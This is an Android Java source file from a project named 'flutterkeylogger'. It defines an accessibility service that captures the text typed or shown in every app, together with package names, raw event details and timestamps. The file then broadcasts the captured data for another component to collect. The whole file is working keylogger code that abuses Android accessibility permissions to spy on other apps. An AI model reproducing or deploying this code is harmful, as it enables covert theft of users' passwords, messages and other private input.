package youtube.sidtube.flutterkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.util.HashMap;

public class Accservice extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        makeTypeAndSend(event, AccessibilityEvent.eventTypeToString(event.getEventType()));

    }

    void makeTypeAndSend(AccessibilityEvent event, String type) {
        String data = event.getText().toString();
        String packageName = event.getPackageName()!=null? event.getPackageName().toString():"";
        HashMap<String, String> datas = new HashMap();
        datas.put("text", data);
        datas.put("raw",event.toString());
        datas.put("packageName", packageName);
        datas.put("type", type);
        datas.put("time",String.valueOf( event.getEventTime()));
        Intent intent = new Intent();
        intent.putExtra("log", datas);
        intent.setAction("android.accessibilityservice.AccessibilityService");
        sendBroadcast(intent);
    }

    @Override
    public void onInterrupt() {
    }
}



